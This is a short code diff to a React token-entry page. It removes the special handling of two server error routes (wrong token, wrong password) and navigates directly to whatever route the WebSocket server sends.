@@ -19,18 +19,7 @@ const TokenPage = () => {
   const { send } = useWebSocket({
     reconectarPayload: { dispositivo },
     onRedirect: (msg) => {
-      const route = resolveServerRoute(msg.url);
-      if (route === "/erro:token_incorreto") {
-        setErro("Token incorreto. Tente novamente.");
-        setIsLoading(false);
-        return;
-      }
-      if (route === "/erro:senha_incorreta") {
-        setErro("Senha incorreta.");
-        setIsLoading(false);
-        return;
-      }
-      navigate(route);
+      navigate(resolveServerRoute(msg.url));
     },
     onMessage: (msg) => {
       if (msg.acao === "erro_token") {
